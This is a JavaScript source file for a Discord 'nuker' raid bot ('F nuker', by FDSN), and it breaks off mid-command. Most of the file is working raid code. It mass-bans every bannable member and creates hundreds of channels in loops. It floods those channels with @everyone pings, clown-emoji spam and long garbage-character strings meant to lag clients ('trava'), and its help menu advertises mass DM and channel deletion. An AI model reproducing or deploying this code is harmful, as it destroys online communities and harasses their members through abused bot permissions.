
const Discord = require('discord.js');
const client = new Discord.Client();
const { red, green, blue, yellow, cyan, greenBright, redBright, bgMagentaBright, magenta, magentaBright, yellowBright, bgRedBright, blueBright } = require('chalk');
const settings = require('./settings.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const organisation = settings.organisation;
const invite = settings.invite;

// Title

const amy = String.raw`
                                                                                     
███████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██╔════╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
█████╗      ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██╔══╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║         ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝         ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                       ${founder}
`;

console.log(red(amy));

client.on("ready", () => {
    console.log(``);
    console.log(``);
    console.log(greenBright(`LOGIN: Successful`));
    console.log(greenBright(`CLIENT: ${client.user.username}#${client.user.discriminator}`));
    console.log(greenBright(`PREFIX: ${prefix}`));

    client.user.setActivity({
        name: "Hakiado?",
        type: "STREAMING",
        url: "https://www.twitch.tv/mucalol", // Follow my twitch ;) | Feel free to change these
    })
});

// Test/Ping

client.on("message", message => {

    // Test Command
    if (message.content.startsWith(prefix + "ping")) {
        message.channel.send("Pong!")
    }


});

// AMY NUKER

client.on('message', message => {

    if (message.content.startsWith(prefix + 'help')) {
        const helpembed = new Discord.MessageEmbed()
            .setTitle(`F nuker`)
            .setDescription(`\`NUKE\` \n\`ABOUT\` \n\`INVITE\` [FDSN](${invite})`)
            .setFooter(`| Prefix: ${prefix} | By: ${founder}`)
            .setColor(0xFF0000)
        message.channel.send(helpembed);
    }

    if (message.content.startsWith(prefix + 'nuke')) {
        const helpembed = new Discord.MessageEmbed()
            .setTitle(`NUKER`)
            .setDescription(`\`MASS BAN\`: **mban** \n\`CREATE CHANNELS\`: **cc [text]** \n\`MASS DELETE CHANNELS\`: **cd** \n\`MASS PING AND CHANNELS\`: **mp** \n\`FUCK SERVER\`: **fuck [text]**\n\`MASS DM\`: dm [text]\n\`Ultra ping\`:Ultra ping\n\`TravaLink\`:travalink\n\`Trava\`:trava\n\`Reset\`:reset\n\`Paiaço\`:clown`)
            .setFooter(`© FDSN | Prefix: ${prefix} | By: ${founder}`)
            .setColor(0xFF0000)
        message.channel.send(helpembed);
    }

    // Comando sobre
    if (message.content.startsWith(prefix + 'about')) {
        const about = new Discord.MessageEmbed()
            .setTitle(` About`)
            .setDescription(`*FDSN*`)
            .setThumbnail(`${client.user.avatarURL({ dynamic: true })}`)
            .setFooter(`| Prefix: ${prefix} | By: ${founder}`)
            .setColor(0xFFFEFE)
            .setTimestamp(Date.now());
        message.channel.send(about);
    }

    // Purgr

    if (message.content.startsWith(prefix + "clear")) {

        let color = ((1 << 24) * Math.random() | 0).toString(16); //Generates random hex value.

        const nopurgeembed = new Discord.MessageEmbed()
            .setDescription("*You don't have permission to use this command*")
            .setColor(`#${color}`)

        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');

        if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send(nopurgeembed)
        if (message.member.hasPermission("ADMINISTRATOR")) {
            message.channel.bulkDelete(argresult).then(() => {
                message.channel.send(`***deleted ${argresult} messages***`)
                    .then(message => {
                        message.delete({ timeout: 1000 })
                    })
            })
        }

    }













    //Mass ban normalzin
    if (message.content.startsWith(prefix + 'mban')) {

        message.guild.members.cache.filter(member => member.bannable).forEach(member => {
            member.ban().then(
                console.log(bgMagentaBright(`${member.user.username} Has been banned `))
            )
        });
        message.delete({ timeout: 1000 });
        try {

        } catch (e) {

            console.log(e.stack);

        }
    }




    //Mass ban cosmico
    if (message.content.startsWith(prefix + 'mbanfucker')) {  

        message.guild.members.cache.filter(member => member.bannable).map(member => {
            member.ban().then(
                console.log(magentaBright(`${member.user.username} Has been banned `))
            )
        });
        message.delete({ timeout: 1000 });
        try {

        } catch (e) {

            console.log(e.stack);

        }
    }






    // Mass Channels      
    if (message.content.startsWith(prefix + 'cc')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        for (var i = 0; i < 250; i++) {
            message.guild.channels.create(argresult)
            console.log(yellowBright(`CHANNEL MASSED!`))
        }

    }







    // Mass Channel & Ping Every Channel
    if (message.content.startsWith(prefix + 'mp')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        // If you dont give an input
        if (!argresult) {
            for (var i = 0; i < 250; i++) {
                message.guild.channels.create('Poct Poct')

                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create('Poct Poct Poct')

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone')
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }

            }
        }










        // If you give an input
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult)

            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('@everyone')
                        console.log(blueBright(`CHANNEL PINGED!`));
                        // other per-channnel logic
                    }
                }
            );
        }
    }











    //Raid dell

























    //PAiaço

    if (message.content.startsWith(prefix + 'clown')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        //Se n der args
        if (!argresult) {
            for (var i = 0; i < 250; i++) {
                message.guild.channels.create('F')

                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create('F')

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('🤡 🤡 🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡@everyone')
                                // other per-channnel logic
                            }
                        }
                    );
                }

            }
        }
        //Se dar argumentos
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult)

            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('🤡 🤡 🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡FDSN esteve aki 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡🤡 🤡@everyone')
                        console.log(blueBright(`CHANNEL PINGED!`));
                        // Logiga de ping por canal
                    }
                }
            );
        }
    }



    //Trava 

    if (message.content.startsWith(prefix + 'trava')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        //Se n der args
        if (!argresult) {
            for (var i = 0; i < 250; i++) {
                message.guild.channels.create('Poct Poct')

                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create('Poct Poct Poct')

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('龘龘꧁龘龘龘︿⇝龘龘_龘0龘9龘̈d龘龘龘龘龘92龘3龘龘龘龘:龘龘%^龘7̈_龘龘龘︿︶龘:龘龘龘龘☠龘~龘龘龘%龘龘龘龘龘龘ヅ龘!~̤龘̤︿6龘6龘꧁︶龘꧁꧁（龘龘龘∩̤龘➤☣☠̈︿̈w龘:龘#龘龘☣☣龘:$⇝:3龘龘龘w龘龘龘1龘&龘̈龘龘*龘20龘&∩︿（⇝♀龘龘5龘（:88龘♀龘龘龘龘龘龘龘龘龘⇝$^̤9-̤$龘_龘龘（（^龘龘̤~̤龘龘∩龘龘龘龘5%6꧂龘龘龘龘9̤龘龘龘龘⇝龘龘龘龘︶̤龘龘龘龘龘*龘w龘➤龘龘∩̤龘̈龘_龘龘（7:-:w龘龘☣̤94ヅ:♀-⇝龘龘龘龘龘꧁-龘̤̈:♀9龘龘龘龘@龘龘龘1꧁龘:#d#龘︶龘^龘꧁&╭w$龘龘☣̤6龘9）*̤d̤龘）龘龘龘龘龘龘♀:龘786龘╮d龘龘:꧁̤̈龘ヅ♀龘☣龘1龘龘龘︶龘:龘6龘̈龘̈龘♀2-︶龘̤龘龘︿龘8%ヅ龘龘龘︿龘̈̈⇝龘龘w龘）#龘̤*̈龘龘龘&龘1龘龘龘龘!龘︿龘&龘龘~龘︶龘☣5龘龘⇝龘龘龘꧂%龘%∩:）龘龘龘龘̈龘龘龘!龘:龘龘龘龘龘龘龘龘̤龘龘̤龘ヅ）（龘龘龘:4➤龘龘龘̤6龘龘龘̤龘龘龘1龘龘龘龘龘∩龘龘龘龘︶龘╭5龘龘8龘̈̈龘龘3龘9龘龘龘龘:╭龘龘_̤龘龘龘龘*龘（-龘̈d龘龘♀龘∩5w︶̈-龘龘龘龘）龘♀꧁龘龘79龘龘龘!龘꧁龘♀龘3̤龘龘8龘龘6➤♀龘龘*龘*̤龘龘龘8龘̈龘̈龘*꧁2*̤$̈➤龘龘:龘龘☠龘̈_（̈龘:龘-龘龘龘̤龘^龘龘龘☠╮龘龘龘龘龘9*龘龘9龘龘0龘%龘龘%☣龘（龘4（龘龘龘̤6龘#龘龘龘̈╮龘╮龘̈∩龘龘!龘$龘龘龘龘龘̤d̤龘⇝̤d̤4̈龘d龘龘%龘:&龘龘̤龘龘龘̤龘龘̈）9龘龘龘@龘➤⇝龘%龘☠龘:龘龘̤̈%龘ヅ╮龘龘龘̈龘龘龘龘龘龘12龘龘9龘d☣龘龘龘2龘龘龘&龘33︶龘龘%龘!龘龘龘龘龘̤~龘︿꧂龘龘̤龘龘龘龘龘龘龘龘龘龘龘龘龘龘龘$龘︶龘^̤̤0龘:꧁╭龘）龘̈龘龘d龘龘w龘龘龘ヅ̈龘龘龘☠2龘龘龘龘龘2）27龘ヅ龘龘ヅ龘︿∩龘☣龘ヅ-龘龘龘̤⇝龘0龘~龘8➤龘3龘7̤龘∩̈龘0_:︶̈♀9̈╭龘（龘龘龘龘龘龘龘̤1̤̈☠d︶龘龘龘➤&龘龘龘龘龘龘龘@龘龘龘☣龘̈龘̤@d6︶龘龘龘̈~龘龘龘龘龘╮龘-!龘龘4龘龘ヅ☣:5龘9!龘龘龘龘龘龘̤龘ヅ龘龘̈龘̤龘龘@龘̤︶7龘龘#:︶龘龘6龘龘-（龘龘4꧁7:龘^∩龘0龘龘^_龘龘꧁$╭龘4龘︶龘龘$龘龘龘龘!龘5龘̈龘╮5龘龘&龘龘龘꧂龘*龘╭︶）龘龘龘龘~龘龘龘⇝&龘̈╮龘∩龘龘龘龘̈_龘龘龘☠~龘╭龘龘龘╭龘꧁龘龘龘龘╮龘龘龘（̈龘╮龘龘龘7龘龘︶龘&龘ヅ龘龘0龘̈龘☣-∩龘5̤龘!龘:8龘龘╭╭2龘龘#（龘︶9龘龘8龘̤龘0╮龘_龘5⇝╭︿d☣︿龘龘̈♀#龘龘龘龘龘̤龘~龘龘~︿̈龘龘_龘龘^%龘龘♀6龘龘&龘龘龘龘龘龘̤龘龘龘龘∩龘#9~@!龘龘̤̈%̈龘꧂9龘龘龘龘-8♀龘@龘̤̈龘龘̈7龘龘龘꧂1龘龘!龘龘龘龘̈龘̈龘̈龘龘龘︶龘̈⇝龘_龘!龘龘︶龘4︿龘龘︶龘7龘_:龘̤̈龘:╭龘龘1龘5龘龘0龘）龘龘龘龘̈☠̤龘龘#︶龘︶̈龘龘龘龘龘0龘$龘龘龘3龘:龘̈龘龘龘龘̤꧁̤龘龘龘龘龘龘︿龘龘:龘̈!~龘꧂龘龘̤~龘龘︿龘6龘╭龘龘龘̈2╮龘龘龘!2ヅ☠̤龘龘龘7龘龘☠龘⇝:̈龘%龘龘龘2龘龘龘龘6龘龘龘@龘➤龘%龘╮&龘!0龘龘@70龘龘龘龘6^龘@︶8~d龘龘龘╮龘龘龘*4龘6龘^龘̤̈龘龘龘龘龘龘4̈@8龘龘龘!龘7̤龘龘#̤龘04╮龘龘龘龘龘龘╭龘龘̈）龘∩龘@龘☣*龘龘龘龘龘龘龘龘∩∩╭14龘d龘龘龘∩龘龘︶⇝➤%龘#龘8@:龘^龘̈4̈̈2➤龘龘̈龘d龘︿̈^龘龘龘꧂̤龘꧂龘龘̈-w龘龘&龘龘龘龘龘w3̤龘6ヅ龘龘➤龘龘̤龘（☠*龘︿龘龘%☣龘龘龘龘9̤∩5龘龘龘龘龘龘龘龘_꧁龘̤龘龘龘龘龘_꧁龘7̈%龘̈#-̤龘⇝!╮龘&45龘龘龘龘龘龘$̈6龘龘0╮2-龘#╮龘̈:꧂̤龘龘8^龘#龘龘̤龘龘➤龘龘龘︶$➤龘龘龘̈_#龘2ヅ&꧂_龘龘（龘龘龘龘龘*︿龘龘︶⇝龘龘龘☣̤龘龘$龘龘龘-w龘̤龘龘̈龘-@5龘^龘龘龘:5:1龘~龘:龘龘龘龘☠︶龘龘龘龘龘龘龘︶➤̈7︿@9龘龘︿龘龘꧁龘9̈龘龘~̈龘龘̤龘龘∩龘龘♀）̈龘（91龘龘龘̈龘龘龘4*̈꧁2龘̤̤龘龘龘!^龘龘d̤3☠龘）龘龘龘➤%:☣̈龘龘@龘龘̈꧁龘̤☠龘^龘龘龘︿-龘^2龘龘̈龘̤龘龘ヅ龘1龘w&龘龘⇝龘龘龘w龘龘7龘∩︿龘龘̤꧂2⇝╮꧁龘︶ヅ̈%9龘3龘̤̈龘龘龘龘︶龘龘̤龘:龘̈龘̤5龘龘龘龘龘龘8龘龘龘19̤̤̤龘0龘:龘︶龘̤5̤̤龘龘龘☠龘龘19~̈➤（̤龘龘7龘龘︿龘-龘︿龘龘龘♀龘龘̈#龘8龘龘龘%龘龘̈7︿）1╭龘╮龘ヅ☣龘龘龘龘-龘-龘龘_:︶w龘╭:♀龘龘龘龘ヅ&龘龘龘龘︶龘龘̈龘龘d龘龘3̤̈龘︶︶~龘5龘龘龘龘龘̤龘龘꧂︶龘（龘5︿︶龘#龘龘龘龘龘7龘̤龘̈龘龘龘~龘龘龘龘龘龘龘龘龘龘➤~%︿➤︶4龘:ヅ @everyone')
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }

            }
        }
        //Se der args
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult)

            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('龘龘꧁龘龘龘︿⇝龘龘_龘0龘9龘̈d龘龘龘龘龘92龘3龘龘龘龘:龘龘%^龘7̈_龘龘龘︿︶龘:龘龘龘龘☠龘~龘龘龘%龘龘龘龘龘龘ヅ龘!~̤龘̤︿6龘6龘꧁︶龘꧁꧁（龘龘龘∩̤龘➤☣☠̈︿̈w龘:龘#龘龘☣☣龘:$⇝:3龘龘龘w龘龘龘1龘&龘̈龘龘*龘20龘&∩︿（⇝♀龘龘5龘（:88龘♀龘龘龘龘龘龘龘龘龘⇝$^̤9-̤$龘_龘龘（（^龘龘̤~̤龘龘∩龘龘龘龘5%6꧂龘龘龘龘9̤龘龘龘龘⇝龘龘龘龘︶̤龘龘龘龘龘*龘w龘➤龘龘∩̤龘̈龘_龘龘（7:-:w龘龘☣̤94ヅ:♀-⇝龘龘龘龘龘꧁-龘̤̈:♀9龘龘龘龘@龘龘龘1꧁龘:#d#龘︶龘^龘꧁&╭w$龘龘☣̤6龘9）*̤d̤龘）龘龘龘龘龘龘♀:龘786龘╮d龘龘:꧁̤̈龘ヅ♀龘☣龘1龘龘龘︶龘:龘6龘̈龘̈龘♀2-︶龘̤龘龘︿龘8%ヅ龘龘龘︿龘̈̈⇝龘龘w龘）#龘̤*̈龘龘龘&龘1龘龘龘龘!龘︿龘&龘龘~龘︶龘☣5龘龘⇝龘龘龘꧂%龘%∩:）龘龘龘龘̈龘龘龘!龘:龘龘龘龘龘龘龘龘̤龘龘̤龘ヅ）（龘龘龘:4➤龘龘龘̤6龘龘龘̤龘龘龘1龘龘龘龘龘∩龘龘龘龘︶龘╭5龘龘8龘̈̈龘龘3龘9龘龘龘龘:╭龘龘_̤龘龘龘龘*龘（-龘̈d龘龘♀龘∩5w︶̈-龘龘龘龘）龘♀꧁龘龘79龘龘龘!龘꧁龘♀龘3̤龘龘8龘龘6➤♀龘龘*龘*̤龘龘龘8龘̈龘̈龘*꧁2*̤$̈➤龘龘:龘龘☠龘̈_（̈龘:龘-龘龘龘̤龘^龘龘龘☠╮龘龘龘龘龘9*龘龘9龘龘0龘%龘龘%☣龘（龘4（龘龘龘̤6龘#龘龘龘̈╮龘╮龘̈∩龘龘!龘$龘龘龘龘龘̤d̤龘⇝̤d̤4̈龘d龘龘%龘:&龘龘̤龘龘龘̤龘龘̈）9龘龘龘@龘➤⇝龘%龘☠龘:龘龘̤̈%龘ヅ╮龘龘龘̈龘龘龘龘龘龘12龘龘9龘d☣龘龘龘2龘龘龘&龘33︶龘龘%龘!龘龘龘龘龘̤~龘︿꧂龘龘̤龘龘龘龘龘龘龘龘龘龘龘龘龘龘龘$龘︶龘^̤̤0龘:꧁╭龘）龘̈龘龘d龘龘w龘龘龘ヅ̈龘龘龘☠2龘龘龘龘龘2）27龘ヅ龘龘ヅ龘︿∩龘☣龘ヅ-龘龘龘̤⇝龘0龘~龘8➤龘3龘7̤龘∩̈龘0_:︶̈♀9̈╭龘（龘龘龘龘龘龘龘̤1̤̈☠d︶龘龘龘➤&龘龘龘龘龘龘龘@龘龘龘☣龘̈龘̤@d6︶龘龘龘̈~龘龘龘龘龘╮龘-!龘龘4龘龘ヅ☣:5龘9!龘龘龘龘龘龘̤龘ヅ龘龘̈龘̤龘龘@龘̤︶7龘龘#:︶龘龘6龘龘-（龘龘4꧁7:龘^∩龘0龘龘^_龘龘꧁$╭龘4龘︶龘龘$龘龘龘龘!龘5龘̈龘╮5龘龘&龘龘龘꧂龘*龘╭︶）龘龘龘龘~龘龘龘⇝&龘̈╮龘∩龘龘龘龘̈_龘龘龘☠~龘╭龘龘龘╭龘꧁龘龘龘龘╮龘龘龘（̈龘╮龘龘龘7龘龘︶龘&龘ヅ龘龘0龘̈龘☣-∩龘5̤龘!龘:8龘龘╭╭2龘龘#（龘︶9龘龘8龘̤龘0╮龘_龘5⇝╭︿d☣︿龘龘̈♀#龘龘龘龘龘̤龘~龘龘~︿̈龘龘_龘龘^%龘龘♀6龘龘&龘龘龘龘龘龘̤龘龘龘龘∩龘#9~@!龘龘̤̈%̈龘꧂9龘龘龘龘-8♀龘@龘̤̈龘龘̈7龘龘龘꧂1龘龘!龘龘龘龘̈龘̈龘̈龘龘龘︶龘̈⇝龘_龘!龘龘︶龘4︿龘龘︶龘7龘_:龘̤̈龘:╭龘龘1龘5龘龘0龘）龘龘龘龘̈☠̤龘龘#︶龘︶̈龘龘龘龘龘0龘$龘龘龘3龘:龘̈龘龘龘龘̤꧁̤龘龘龘龘龘龘︿龘龘:龘̈!~龘꧂龘龘̤~龘龘︿龘6龘╭龘龘龘̈2╮龘龘龘!2ヅ☠̤龘龘龘7龘龘☠龘⇝:̈龘%龘龘龘2龘龘龘龘6龘龘龘@龘➤龘%龘╮&龘!0龘龘@70龘龘龘龘6^龘@︶8~d龘龘龘╮龘龘龘*4龘6龘^龘̤̈龘龘龘龘龘龘4̈@8龘龘龘!龘7̤龘龘#̤龘04╮龘龘龘龘龘龘╭龘龘̈）龘∩龘@龘☣*龘龘龘龘龘龘龘龘∩∩╭14龘d龘龘龘∩龘龘︶⇝➤%龘#龘8@:龘^龘̈4̈̈2➤龘龘̈龘d龘︿̈^龘龘龘꧂̤龘꧂龘龘̈-w龘龘&龘龘龘龘龘w3̤龘6ヅ龘龘➤龘龘̤龘（☠*龘︿龘龘%☣龘龘龘龘9̤∩5龘龘龘龘龘龘龘龘_꧁龘̤龘龘龘龘龘_꧁龘7̈%龘̈#-̤龘⇝!╮龘&45龘龘龘龘龘龘$̈6龘龘0╮2-龘#╮龘̈:꧂̤龘龘8^龘#龘龘̤龘龘➤龘龘龘︶$➤龘龘龘̈_#龘2ヅ&꧂_龘龘（龘龘龘龘龘*︿龘龘︶⇝龘龘龘☣̤龘龘$龘龘龘-w龘̤龘龘̈龘-@5龘^龘龘龘:5:1龘~龘:龘龘龘龘☠︶龘龘龘龘龘龘龘︶➤̈7︿@9龘龘︿龘龘꧁龘9̈龘龘~̈龘龘̤龘龘∩龘龘♀）̈龘（91龘龘龘̈龘龘龘4*̈꧁2龘̤̤龘龘龘!^龘龘d̤3☠龘）龘龘龘➤%:☣̈龘龘@龘龘̈꧁龘̤☠龘^龘龘龘︿-龘^2龘龘̈龘̤龘龘ヅ龘1龘w&龘龘⇝龘龘龘w龘龘7龘∩︿龘龘̤꧂2⇝╮꧁龘︶ヅ̈%9龘3龘̤̈龘龘龘龘︶龘龘̤龘:龘̈龘̤5龘龘龘龘龘龘8龘龘龘19̤̤̤龘0龘:龘︶龘̤5̤̤龘龘龘☠龘龘19~̈➤（̤龘龘7龘龘︿龘-龘︿龘龘龘♀龘龘̈#龘8龘龘龘%龘龘̈7︿）1╭龘╮龘ヅ☣龘龘龘龘-龘-龘龘_:︶w龘╭:♀龘龘龘龘ヅ&龘龘龘龘︶龘龘̈龘龘d龘龘3̤̈龘︶︶~龘5龘龘龘龘龘̤龘龘꧂︶龘（龘5︿︶龘#龘龘龘龘龘7龘̤龘̈龘龘龘~龘龘龘龘龘龘龘龘龘龘➤~%︿➤︶4龘:ヅ @everyone')
                        console.log(blueBright(`CHANNEL PINGED!`));
                        // other per-channnel logic
                    }
                }
            );
        }
    }




    //ULtra ping

    if (message.content.startsWith(prefix + 'ultraping')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        // If you dont give an input
        if (!argresult) {
            for (var i = 0; i < 250; i++) {
                message.guild.channels.create('Poct Poct')

                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create('Poct Poct Poct')

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone@everyone @everyone@everyone @everyone@everyone @everyone')
                                console.log(blueBright(`CHANNEL PINGED!`));

                              for (var i = 0; i < 250; i++){
                                channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone@everyone @everyone@everyone @everyone@everyone @everyone')
                              }
                            }
                        }
                    );
                }

            }
        }
        // If you give an input
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create(argresult)

            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone@everyone @everyone@everyone @everyone@everyone @everyone')
                        console.log(blueBright(`CHANNEL PINGED!`));
                        // other per-channnel logic
                    }
                }
            );
        }
    }

    //Trava server

    if (message.content.startsWith(prefix + 'travalink')) {
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(' ');
        // If you dont give an input
        if (!argresult) {
            for (var i = 0; i < 250; i++) {
                message.guild.channels.create('Poct Poct')

                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create('Poct Poct Poct')

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
